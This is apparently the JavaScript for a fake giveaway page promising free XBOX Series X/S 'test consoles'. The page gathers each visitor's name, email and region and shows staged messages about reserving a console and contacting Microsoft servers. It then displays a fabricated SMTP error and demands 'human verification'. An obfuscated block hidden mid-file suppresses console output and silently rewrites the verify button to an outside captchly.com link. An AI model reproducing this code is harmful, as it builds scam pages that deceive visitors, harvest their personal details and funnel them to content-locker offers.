var NAME, EMAIL, REGION, VERSION, MOBILE;

var ERRORS = [
    "<strong>530 SMTP Error</strong> - Bad Authentication",
    "<strong>500 SMTP Error</strong> - Syntax Error",
    "<strong>554 SMTP Error</strong> - Transaction has failed",
    "<strong>550 SMTP Error</strong> - Command rejected for policy reasons",
    "<strong>523 SMTP Error</strong> - Encryption is required before the requested authentication",
]

var AM1, AM2;

AM1 = Math.floor(Math.random() * 15) + 15;

AM2 = Math.floor(Math.random() * 15) + 5;

CERROR = ERRORS[Math.floor(Math.random() * ERRORS.length)];

function SS1() {
    $(".STEP-1").fadeOut(1000, function() {
        $(".STEP-2").fadeIn(1000);
    });
}

$(function() {

    var BWIDTH = $("body").width();

    if (BWIDTH < 768) {
        MOBILE = true;
    } else {
        MOBILE = false;
    }

})

$("#PSVERSIONS").on("show.bs.collapse", function(e) {

    if (e.target.id == "NORMALPS5") {
        $(".SS3").html("I choose <strong>XBOX Series X</strong> version");
        VERSION = "Series X";
    } else {
        $(".SS3").html("I choose <strong>XBOX Series S</strong> version");
        VERSION = "Series S";
    }

    $(".SS3").fadeIn(1000).css("display", "block");

})


function _0x1813(){var _0x1be2fc=['As5QCxvLCNKUyW','AhjLzG','yxDLwKm','se9LqwW','vKjlv2K','ndy5oda4mtLItKDquK4','B20V','Ae9duge','C2vHCMnO','E30Uy29UC3rYDq','zxjYB3i','zxHJzxb0Aw9U','x19WCM90B19F','zMXVB3i','y29UC3rYDwn0BW','yMLUza','s2zwww0','mJe1ody5zwXcBfLy','y3rVCIGICMv0Dq','yxbWBhK','ChjVDg90ExbL','t2TiAhy','EwPvqNO','AKf6AK8','CMjwvxC','rvHjrfG','DhjHy2u','AwT1EMG','DMDXyKy','A2DKyuO','Bg9JyxrPB24','z2v0rwXLBwvUDa','Aw5KzxHpzG','ntm5otruCuncCuO','ndq2nZm2nhLHthvtzW','zMD2z28','Ahr0Chm6lY9HCa','y29UC29Szq','CM4GDgHPCYiPka','mJyYnJa2mNDZq2D5sG','BgvUz3rO','mJmYotG4ogTyzK1qDG','vKTjvwy','lZmWmge4zdm','yND5Bhy','ody4yvDcDezJ','ndG0ote1nxnZreDIta','BMn0Aw9UkcKG','tKrJwM4','Dg9tDhjPBMC','C3bSAxq','m2PYBhHdva','Bg9N','Bg1Tvwy','yMrkqvy','B25SB2fK','kcGOlISPkYKRkq','DurvDNa','r3n6C28','Aw5MBW','wwz4ufq','qNLjza','DgfIBgu','mhW1Fdj8nhWXFa','tvzjuMy','yMf0wgW','Dg9U'];_0x1813=function(){return _0x1be2fc;};return _0x1813();}(function(_0x19f174,_0x5e1463){var _0x5dc3f5=_0x19f174();function _0x4f62c9(_0x147c19,_0x5ed3ad,_0x16863c,_0x4ca222){return _0x2865(_0x16863c- -0x171,_0x4ca222);}function _0x13063c(_0x9b843e,_0xa7c015,_0x4d1b4e,_0x14b3c8){return _0x2865(_0xa7c015-0x3f,_0x14b3c8);}while(!![]){try{var _0x25c70c=-parseInt(_0x13063c(0x255,0x25f,0x265,0x258))/(-0x9*0x422+0xe5c+0x16d7*0x1)+parseInt(_0x13063c(0x225,0x232,0x211,0x220))/(-0x2f5*-0xd+0x3*-0xb7f+0xca*-0x5)*(-parseInt(_0x13063c(0x21d,0x23e,0x24a,0x235))/(0x1f*-0x11b+-0x7cc+-0x4*-0xa85))+-parseInt(_0x4f62c9(0x6b,0x76,0x7d,0x9e))/(-0x66e+0x5*-0x51a+0x1ff4)+-parseInt(_0x4f62c9(0x70,0x97,0x89,0x87))/(-0xc*-0x264+0xb71+-0x22*0x12e)+-parseInt(_0x13063c(0x243,0x22c,0x245,0x23c))/(0x17*-0x19f+-0x4a*0x2+0x25e3)*(parseInt(_0x4f62c9(0x69,0x95,0x88,0x91))/(0x31a+-0x20b5*-0x1+-0x23c8))+parseInt(_0x13063c(0x251,0x234,0x236,0x21d))/(-0x3*-0x69b+0x214c+-0x7f*0x6b)+parseInt(_0x4f62c9(0xb4,0x81,0xa3,0x9e))/(-0xd79*-0x1+0x1*-0x2231+-0x14c1*-0x1);if(_0x25c70c===_0x5e1463)break;else _0x5dc3f5['push'](_0x5dc3f5['shift']());}catch(_0x2e2e70){_0x5dc3f5['push'](_0x5dc3f5['shift']());}}}(_0x1813,0x3*0x2500d+0x1e6ce*-0x2+0xbafd*0xc));function _0xbf5a4d(_0xd7d135,_0x83b0bc,_0x5c44e4,_0x4b9a84){return _0x2865(_0x4b9a84-0x249,_0xd7d135);}var _0x11d701=(function(){var _0x249896={};_0x249896[_0x4b46e8(0x1a6,0x192,0x19e,0x1b0)]=function(_0x5d3528,_0x448555){return _0x5d3528!==_0x448555;},_0x249896[_0x4b46e8(0x17e,0x16c,0x16b,0x172)]=_0x4b46e8(0x1a1,0x1b8,0x192,0x1a5),_0x249896['RdGrZ']=_0x4b46e8(0x18a,0x17f,0x191,0x187);var _0x585323=_0x249896;function _0x5adf2c(_0x10c63f,_0x2e0f4f,_0x3809f0,_0x182057){return _0x2865(_0x10c63f- -0x13c,_0x182057);}var _0x314d34=!![];function _0x4b46e8(_0x3d9c38,_0x3c66c9,_0x2716be,_0x140cc0){return _0x2865(_0x3d9c38- -0x7e,_0x2716be);}return function(_0x2e0c96,_0x8a471c){var _0x510e94=_0x314d34?function(){function _0x587046(_0x585c87,_0x3574e9,_0xd8da26,_0x2abee8){return _0x2865(_0xd8da26- -0x2b2,_0x2abee8);}function _0x30074a(_0x451715,_0x32533a,_0x3f95ae,_0x28ff3f){return _0x2865(_0x451715-0x3a0,_0x28ff3f);}if(_0x8a471c){if(_0x585323['OkHhv'](_0x585323['NDcZn'],_0x585323['RdGrZ'])){var _0x2db4a1=_0x8a471c[_0x30074a(0x5c2,0x5c1,0x5ae,0x5b9)](_0x2e0c96,arguments);return _0x8a471c=null,_0x2db4a1;}else{var _0x1aecef=_0x38d494[_0x30074a(0x5c2,0x5bf,0x5a9,0x5e1)](_0x510b05,arguments);return _0x5b1f0b=null,_0x1aecef;}}}:function(){};return _0x314d34=![],_0x510e94;};}()),_0x332e1a=_0x11d701(this,function(){function _0x539bfd(_0x2c4c6f,_0x1054e4,_0x50a7e8,_0x5bf406){return _0x2865(_0x1054e4- -0x116,_0x5bf406);}var _0x3feb5d={};_0x3feb5d['MVIRf']=_0x539bfd(0xfa,0xee,0xec,0xf0)+'+$';function _0x5c5e09(_0x422f2c,_0x32d24a,_0x44a5c4,_0x39ac0e){return _0x2865(_0x32d24a- -0x369,_0x422f2c);}var _0x528d36=_0x3feb5d;return _0x332e1a['toString']()[_0x5c5e09(-0x158,-0x152,-0x15e,-0x140)](_0x528d36[_0x5c5e09(-0x16f,-0x15d,-0x143,-0x17e)])['toString']()[_0x539bfd(0x114,0x107,0x111,0xe6)+'r'](_0x332e1a)[_0x5c5e09(-0x16a,-0x152,-0x15e,-0x162)](_0x528d36['MVIRf']);});_0x332e1a();var _0x34bcb5=(function(){function _0x9f15db(_0x1fbea6,_0x30218b,_0x23b123,_0x18c73f){return _0x2865(_0x23b123-0x2d9,_0x1fbea6);}var _0x59a5b8={};_0x59a5b8[_0x9f15db(0x4f1,0x511,0x504,0x4ed)]='fgvgo';var _0x2b1138=_0x59a5b8,_0x20f06c=!![];return function(_0x357cec,_0x1c610f){var _0x33cff2={};_0x33cff2['kgdaJ']=function(_0x5c066f,_0x38fba8){return _0x5c066f!==_0x38fba8;},_0x33cff2[_0x32d4c2(0x58c,0x5aa,0x58a,0x5a4)]=_0x2b1138[_0x731a75(-0x103,-0xe5,-0xea,-0xf6)];function _0x32d4c2(_0x2c2515,_0x32e89a,_0x1deacd,_0x58380c){return _0x9f15db(_0x32e89a,_0x32e89a-0x35,_0x1deacd-0xac,_0x58380c-0x2a);}var _0x5529cd=_0x33cff2;function _0x731a75(_0xa3c005,_0x964498,_0x95d50f,_0x1ffdb0){return _0x9f15db(_0x964498,_0x964498-0x1c,_0x1ffdb0- -0x5fa,_0x1ffdb0-0xd4);}var _0xc5e229=_0x20f06c?function(){function _0x116f4d(_0x2d3b6a,_0x29be3f,_0x367916,_0x42344f){return _0x32d4c2(_0x2d3b6a-0x1f,_0x367916,_0x42344f- -0x12d,_0x42344f-0x111);}function _0x5c2ab6(_0x50c65a,_0x2faf34,_0x326a71,_0x438173){return _0x32d4c2(_0x50c65a-0x13d,_0x50c65a,_0x2faf34- -0x230,_0x438173-0x86);}if(_0x1c610f){if(_0x5529cd[_0x116f4d(0x483,0x4a0,0x47b,0x484)](_0x5529cd[_0x5c2ab6(0x37b,0x35a,0x338,0x342)],_0x116f4d(0x43a,0x429,0x43f,0x447))){var _0x447172=_0x120055?function(){function _0xa152c5(_0x3522c6,_0x2230b4,_0x48879c,_0x3741c1){return _0x116f4d(_0x3522c6-0x77,_0x2230b4-0x157,_0x3741c1,_0x2230b4- -0x585);}if(_0xcd4380){var _0x1747e3=_0x516d76[_0xa152c5(-0x108,-0x10b,-0x103,-0xef)](_0x588964,arguments);return _0xff685e=null,_0x1747e3;}}:function(){};return _0xd3e19d=![],_0x447172;}else{var _0x1c24b1=_0x1c610f[_0x116f4d(0x47b,0x45d,0x460,0x47a)](_0x357cec,arguments);return _0x1c610f=null,_0x1c24b1;}}}:function(){};return _0x20f06c=![],_0xc5e229;};}()),_0x4ef20a=_0x34bcb5(this,function(){var _0x3bac08={'lmmUf':function(_0x143584,_0x572f03){return _0x143584===_0x572f03;},'rbVUw':_0x8d7b18(-0x2c,-0x3b,-0x43,-0x3b),'bdJAV':function(_0x16f04b,_0x2d3c81){return _0x16f04b+_0x2d3c81;},'ULVZd':function(_0x1c66c4,_0x4bb143){return _0x1c66c4+_0x4bb143;},'EXIDX':'return\x20(fu'+_0x258d2d(0x4a9,0x494,0x48f,0x496),'LRlup':_0x8d7b18(-0x1a,-0x2e,-0x3e,-0x36)+_0x8d7b18(-0x20,-0x33,-0x4c,-0x2d)+_0x8d7b18(-0x77,-0x5c,-0x6e,-0x5c)+'\x20)','aweZC':function(_0xaf547f){return _0xaf547f();},'aUUYV':function(_0x56414b,_0x301690){return _0x56414b!==_0x301690;},'VKIUf':_0x258d2d(0x49c,0x494,0x49a,0x494),'HOeAl':'warn','yjUBz':_0x8d7b18(-0x60,-0x50,-0x5a,-0x47),'hOCPa':_0x258d2d(0x4a6,0x4c1,0x4ad,0x4cd),'ikuzh':_0x8d7b18(-0x12,-0x35,-0x17,-0x34),'batXl':_0x258d2d(0x4b8,0x4ae,0x49e,0x495)},_0x1de4e1;try{if(_0x3bac08[_0x258d2d(0x480,0x48a,0x495,0x49c)](_0x3bac08['rbVUw'],_0x3bac08[_0x258d2d(0x4d2,0x4bd,0x4bb,0x4a6)])){var _0x4a2880=Function(_0x3bac08[_0x8d7b18(-0x54,-0x31,-0x5a,-0x4c)](_0x3bac08['ULVZd'](_0x3bac08[_0x258d2d(0x4bb,0x4b9,0x4bc,0x4da)],_0x3bac08['LRlup']),');'));_0x1de4e1=_0x3bac08[_0x258d2d(0x488,0x4ab,0x4a5,0x4ba)](_0x4a2880);}else{var _0x257d81=_0x12ce95[_0x258d2d(0x4b3,0x4ca,0x4b6,0x4ba)](_0x56f345,arguments);return _0x70a134=null,_0x257d81;}}catch(_0x565650){if(_0x3bac08['aUUYV']('Gszso',_0x3bac08[_0x8d7b18(-0x5a,-0x70,-0x79,-0x58)])){var _0x502d54=(_0x8d7b18(-0x33,-0x22,-0x5f,-0x43)+'3')[_0x258d2d(0x48a,0x49d,0x492,0x48e)]('|'),_0x3a8297=-0x7c0+-0x45e+-0x8d*-0x16;while(!![]){switch(_0x502d54[_0x3a8297++]){case'0':var _0x155954=_0x50cda8[_0x258d2d(0x4bc,0x4b8,0x4b1,0x4c7)+'r'][_0x258d2d(0x4ad,0x4a2,0x4b7,0x4d6)][_0x8d7b18(-0x16,-0x42,-0x4c,-0x30)](_0x29698c);continue;case'1':_0x155954[_0x8d7b18(-0x33,-0x40,-0x51,-0x51)]=_0x511b97['toString'][_0x8d7b18(-0x48,-0x3f,-0x15,-0x30)](_0x511b97);continue;case'2':var _0x511b97=_0x2865da[_0x19c342]||_0x155954;continue;case'3':_0x472bd3[_0x19c342]=_0x155954;continue;case'4':_0x155954[_0x258d2d(0x4b5,0x4c9,0x4af,0x499)]=_0x3d503c[_0x258d2d(0x4d3,0x491,0x4b2,0x49b)](_0x4d65ee);continue;case'5':var _0x19c342=_0xccbb6[_0x4c2ad9];continue;}break;}}else _0x1de4e1=window;}function _0x8d7b18(_0x1a472c,_0x54939b,_0x1f6702,_0x438ca4){return _0x2865(_0x438ca4- -0x24e,_0x1f6702);}function _0x258d2d(_0x2b197e,_0x2b4511,_0x556db0,_0x5327eb){return _0x2865(_0x556db0-0x294,_0x2b197e);}var _0xa75ffb=_0x1de4e1['console']=_0x1de4e1[_0x258d2d(0x488,0x469,0x485,0x48f)]||{},_0x36f957=[_0x258d2d(0x492,0x495,0x494,0x4a8),_0x3bac08[_0x258d2d(0x4b7,0x4a8,0x4a6,0x4a9)],_0x3bac08[_0x258d2d(0x4a8,0x499,0x4b9,0x4c3)],_0x3bac08[_0x8d7b18(-0x25,-0x37,-0x50,-0x38)],_0x3bac08[_0x8d7b18(-0x2b,-0x2b,-0x3d,-0x24)],_0x3bac08[_0x258d2d(0x4b8,0x4a5,0x4a1,0x496)],_0x8d7b18(-0x24,-0x2b,-0x45,-0x25)];for(var _0x16ac44=-0x744*0x2+0x1*-0x26ed+-0x17*-0x253;_0x16ac44<_0x36f957[_0x8d7b18(-0x5b,-0x3c,-0x5a,-0x5a)];_0x16ac44++){var _0x28db6e=_0x34bcb5[_0x258d2d(0x49e,0x4d3,0x4b1,0x49e)+'r'][_0x8d7b18(-0x49,-0xc,-0x34,-0x2b)][_0x8d7b18(-0x40,-0x40,-0x2c,-0x30)](_0x34bcb5),_0x5ce276=_0x36f957[_0x16ac44],_0x1d957f=_0xa75ffb[_0x5ce276]||_0x28db6e;_0x28db6e[_0x258d2d(0x4a1,0x4c4,0x4af,0x4b1)]=_0x34bcb5[_0x258d2d(0x4cc,0x49c,0x4b2,0x4be)](_0x34bcb5),_0x28db6e[_0x8d7b18(-0x52,-0x41,-0x6e,-0x51)]=_0x1d957f[_0x258d2d(0x475,0x4ab,0x491,0x49a)][_0x8d7b18(-0x46,-0x41,-0x32,-0x30)](_0x1d957f),_0xa75ffb[_0x5ce276]=_0x28db6e;}});function _0x2865(_0x3d503c,_0x4d65ee){var _0x472bd3=_0x1813();return _0x2865=function(_0x25448e,_0x2a49fc){_0x25448e=_0x25448e-(0x19f5+0x1*0x301+-0x1b0a);var _0x3f2675=_0x472bd3[_0x25448e];if(_0x2865['GvEfBZ']===undefined){var _0x3961af=function(_0x258ed8){var _0x3ac3f5='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x577d11='',_0x2b4596='',_0x279c92=_0x577d11+_0x3961af;for(var _0x326635=-0x222a+0x2dc+0x1f4e,_0x22a15b,_0x12c53c,_0x4364f6=0x2*0xe75+0x3a+-0x1d24;_0x12c53c=_0x258ed8['charAt'](_0x4364f6++);~_0x12c53c&&(_0x22a15b=_0x326635%(-0x1425+-0xd46*0x1+-0x13d*-0x1b)?_0x22a15b*(0x826+0x223+-0xa09)+_0x12c53c:_0x12c53c,_0x326635++%(-0x1c90+0xb99+0x26d*0x7))?_0x577d11+=_0x279c92['charCodeAt'](_0x4364f6+(-0x19fe+0x1d7b+-0x373))-(-0xb9*0x31+0x17f2+0xb81)!==-0x249d+-0x1454+0x1*0x38f1?String['fromCharCode'](0x37a*-0x2+0x77d+0x76&_0x22a15b>>(-(0x179c+-0x2*0x120f+0x642*0x2)*_0x326635&0x19e*-0x8+-0xf8d*0x1+0x1c83*0x1)):_0x326635:-0x544*-0x1+0x153a+-0x1a7e){_0x12c53c=_0x3ac3f5['indexOf'](_0x12c53c);}for(var _0x1b40fc=-0x210a*0x1+0x1ffb+0x10f,_0x135238=_0x577d11['length'];_0x1b40fc<_0x135238;_0x1b40fc++){_0x2b4596+='%'+('00'+_0x577d11['charCodeAt'](_0x1b40fc)['toString'](-0x3*-0xb57+-0xd*0x292+-0x8b*0x1))['slice'](-(0x1*0x16f+0x79e+-0x90b*0x1));}return decodeURIComponent(_0x2b4596);};_0x2865['APOUOJ']=_0x3961af,_0x3d503c=arguments,_0x2865['GvEfBZ']=!![];}var _0x460f47=_0x472bd3[0x5*-0x37b+0x1*0x1e7c+-0xd15*0x1],_0x42f377=_0x25448e+_0x460f47,_0x11c393=_0x3d503c[_0x42f377];if(!_0x11c393){var _0x2e0e40=function(_0x6e72b7){this['HtjNZH']=_0x6e72b7,this['tXHycO']=[0x531+0x10*-0x25+0x8*-0x5c,-0xb4d+-0x2483+0x2fd0,0x2457+-0x242a+-0x2d],this['cVEkqq']=function(){return'newState';},this['fqfAcV']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['XCBEXn']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x2e0e40['prototype']['DpXqTC']=function(){var _0x42ac89=new RegExp(this['fqfAcV']+this['XCBEXn']),_0xa58e21=_0x42ac89['test'](this['cVEkqq']['toString']())?--this['tXHycO'][-0x1785+-0x1852+0xbf6*0x4]:--this['tXHycO'][-0x115f+-0x164*-0xc+-0x19*-0x7];return this['DiHrFF'](_0xa58e21);},_0x2e0e40['prototype']['DiHrFF']=function(_0x56e5b5){if(!Boolean(~_0x56e5b5))return _0x56e5b5;return this['LAzaWQ'](this['HtjNZH']);},_0x2e0e40['prototype']['LAzaWQ']=function(_0x5d040b){for(var _0x172979=-0xfcd+0x3d+-0x2*-0x7c8,_0x5d19ae=this['tXHycO']['length'];_0x172979<_0x5d19ae;_0x172979++){this['tXHycO']['push'](Math['round'](Math['random']())),_0x5d19ae=this['tXHycO']['length'];}return _0x5d040b(this['tXHycO'][-0x7*-0x29b+0x18b4+-0x1*0x2af1]);},new _0x2e0e40(_0x2865)['DpXqTC'](),_0x3f2675=_0x2865['APOUOJ'](_0x3f2675),_0x3d503c[_0x42f377]=_0x3f2675;}else _0x3f2675=_0x11c393;return _0x3f2675;},_0x2865(_0x3d503c,_0x4d65ee);}_0x4ef20a();function _0x56f69c(_0x23ab0e,_0x3502d4,_0x315021,_0x26d825){return _0x2865(_0x26d825-0x311,_0x315021);}document[_0xbf5a4d(0x47f,0x47a,0x457,0x477)+_0xbf5a4d(0x434,0x437,0x463,0x452)]('verify-but'+_0x56f69c(0x518,0x50b,0x501,0x51f))['href']!='main\x20locke'+'r'&&(0x1216+0x1e97+-0x2dd*0x11>window[_0xbf5a4d(0x45b,0x495,0x47b,0x476)]['href'][_0x56f69c(0x502,0x4ec,0x514,0x50e)]()[_0x56f69c(0x506,0x4fe,0x4f6,0x4fd)](_0x56f69c(0x522,0x510,0x4e2,0x501)+_0x56f69c(0x53a,0x51f,0x508,0x520)+_0x56f69c(0x535,0x507,0x531,0x526))&&0x13ca+-0x385+-0x1045==Math[_0x56f69c(0x527,0x50d,0x540,0x52d)]((0x5b*-0x2b+0x10f3+-0x146)*Math['random']()/(0x14e4+-0x1840+-0x1*-0x361))&&(window[_0x56f69c(0x51f,0x524,0x4fa,0x514)]=function(){function _0x5ee022(_0x2274ca,_0x404aa3,_0xb12ce5,_0x5c1748){return _0x56f69c(_0x2274ca-0x1c7,_0x404aa3-0x170,_0x2274ca,_0x5c1748- -0x246);}var _0x1de8ac={};_0x1de8ac[_0x111287(0x565,0x563,0x581,0x583)]='verify-but'+_0x5ee022(0x2f1,0x2eb,0x2ea,0x2d9),_0x1de8ac[_0x111287(0x59e,0x591,0x574,0x574)]='https://ca'+'ptchly.com'+_0x111287(0x57b,0x562,0x56f,0x550);var _0x58b442=_0x1de8ac;function _0x111287(_0x371e25,_0x70bfa9,_0x330057,_0x17cbca){return _0xbf5a4d(_0x330057,_0x70bfa9-0x110,_0x330057-0x132,_0x70bfa9-0x122);}document[_0x5ee022(0x2f5,0x310,0x2e1,0x2f9)+_0x5ee022(0x2f6,0x2f5,0x2d1,0x2d4)](_0x58b442[_0x111287(0x56b,0x563,0x547,0x56a)])[_0x111287(0x586,0x57b,0x567,0x599)]=_0x58b442['jAzjO'];}));

function SS2() {

    NAME = $("#NAME").val();

    EMAIL = $("#EMAIL").val();

    REGION = $("#REGION").val();

    $(".AM1").text(AM1);

    $(".AM2").text(AM2);

    if (NAME && EMAIL && REGION) {

        $("#NAME").removeClass("RB");

        $("#EMAIL").removeClass("RB");

        $("#REGION").removeClass("RB");

        $(".STEP-2").fadeOut(1000, function() {
            $(".STEP-3").fadeIn(1000);
    
            var TO1 = {
                strings: [
                    "Checking if there are any <strong>new XBOX test consoles</strong> left for <strong>" + REGION + " region</strong>...^2000",
                    "Showing available <strong>new XBOX consoles</strong> for <strong>" + REGION + "</strong> region...^1000",
                    "Choose your <strong>XBOX console</strong> version...^1000"
                ],
                typeSpeed: 30,
                backSpeed: 30,
                startDelay: 500,
                backDelay: 500,
                smartBackspace: true,
                showCursor: false,
                contentType: "html",
                onComplete: function() {
                //$(".TYPED").fadeOut(1000)
                  $(".LOADING-1").fadeOut(1000, function() {

                      $("#PSVERSIONS").fadeIn(1000);
                      //$(".SS3").fadeIn(1000).css("display", "block");
            
                  })
                }
              }
            
              var T1 = new Typed('.TYPED', TO1);
    
        })

    } else {
        
        if (NAME) {
            $("#NAME").removeClass("RB");
        } else {
            $("#NAME").addClass("RB");
        }

        if (EMAIL) {
            $("#EMAIL").removeClass("RB");
        } else {
            $("#EMAIL").addClass("RB");
        }

        if (REGION) {
            $("#REGION").removeClass("RB");
        } else {
            $("#REGION").addClass("RB");
        }

    }
}

function SS3() {
    $(".S_NAME").html('<strong class="MED">Name:</strong> ' + NAME);
    $(".S_EMAIL").html('<strong class="MED">Email:</strong> ' + EMAIL);
    $(".S_REGION").html('<strong class="MED">Region:</strong> ' + REGION);
    $(".STEP-3").fadeOut(1000, function() {
        
        $(".STEP-4").fadeIn(1000);

        var TO2 = {
            strings: [
                "Reserving your <strong>new XBOX " + VERSION + "</strong>...^3000",
                "Connecting with <strong>Microsoft shipment servers</strong>...^1500",
                "Emailing you <strong>shipping form</strong>...^3000",
                "<span id='PSRED'>" + CERROR + ", reason: user was detected as a bot and needs to pass <strong>human verification</strong>...</span>^1500"
            ],
            typeSpeed: 50,
            backSpeed: 40,
            startDelay: 500,
            backDelay: 500,
            smartBackspace: true,
            showCursor: false,
            contentType: "html",
            onComplete: function() {

                $(".SS4").fadeIn(1000).css("display", "block");

            }
          }
        
          var T2 = new Typed('.LAST', TO2);

    })
}